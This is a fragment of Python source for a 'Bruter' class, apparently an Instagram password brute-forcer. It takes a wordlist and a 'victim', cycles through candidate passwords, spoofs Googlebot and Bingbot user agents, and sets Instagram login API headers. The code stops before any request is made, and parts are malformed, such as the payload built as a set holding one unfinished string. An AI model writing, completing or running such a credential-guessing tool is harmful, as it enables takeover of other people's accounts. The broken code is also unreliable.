import requests
from datetime import datetime

class Bruter:
    def __init__(self,wordlist:str,proxy_type:str,victim:str) -> None:
        self.__wordlist = wordlist
        self.__proxy_type = proxy_type
        self.__victim = victim



    @property
    def __passwordList(self):
        with open(file=self.__wordlist,mode="r",encoding="utf-8") as _passw:
            for p in _passw:
                yield p.replace("\n","")

    def __const__(self):
        self.user_agents =[
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (seoanalyzer; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) SitemapProbe",
            "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
        ]
        self.header = {
            "x-ig-app-id": "936619743392459",
            "x-instagram-ajax": "2f6bf8b37c04",
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://www.instagram.com/",
            "content-type": "application/x-www-form-urlencoded", 
        }
        self.data = {
            f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:"
        }
